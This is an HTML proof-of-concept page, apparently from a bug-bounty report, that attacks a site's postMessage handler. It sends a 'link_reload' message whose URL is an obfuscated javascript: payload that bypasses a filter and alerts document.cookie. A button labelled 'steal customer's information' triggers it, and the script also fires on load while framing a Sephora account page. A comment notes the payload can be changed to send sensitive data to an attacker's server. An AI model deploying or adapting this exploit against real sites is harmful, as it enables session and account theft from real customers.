
<!DOCTYPE html>
<html>
<head>
<title>Get the sensitive information by postmessage</title>
<meta name="referrer" content="never">
</head>
<body>
<button id="openH1">Click Here for start</button>
<button id="stealaccount">steal customer's information</button>
<script>
var h1Win;
var s;
function openWin(){
	h1Win = window.open("https://www.google.com");
	}

	function sendMessage(){
		var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:alert(document.cookie)"});
		//you can change the url payload for send back some sensitive information to the attacker's server
		h1Win.postMessage(data,"*");
		console.log("postmessage reload a new iframe's height and width")
	}

 
    // 接受server返回数据
    window.addEventListener('message', function(e) {
        console.log('Get data from oneplus ---> ' + e);
	//clearInterval(s);
    }, false);
document.getElementById("openH1").addEventListener('click', openWin);
document.getElementById("stealaccount").addEventListener('click', sendMessage);
openWin();
sendMessage();
</script>
<iframe src="https://www.sephora.com/profile/MyAccount" height="700px" width="900px"></iframe>
</body>
</html>
